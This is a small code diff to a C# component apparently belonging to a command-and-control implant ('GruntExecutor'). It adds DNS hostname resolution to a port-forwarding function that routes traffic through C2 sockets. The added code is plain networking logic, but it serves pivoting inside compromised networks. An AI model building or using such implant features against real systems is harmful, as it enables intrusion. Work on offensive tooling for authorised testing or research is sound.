@@ -328,6 +328,18 @@ namespace GruntExecutor
 
             public static string AddPortForward(string ip, string bind_port, string target_port, string target_ip, string rand_port)
             {
+                var match = Regex.Match(ip, @"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b");
+                if (match.Success == false)
+                {
+                    IPAddress[] addresslist = Dns.GetHostAddresses(ip);
+
+                    foreach (IPAddress theaddress in addresslist)
+                    {
+                        Console.WriteLine("Converting to IP");
+                        ip = theaddress.ToString();
+                        break;
+                    }
+                }
                 List<Socket> targets = new List<Socket>();
                 List<Socket> c2s = new List<Socket>();
                 c2_sockets[bind_port] = c2s;
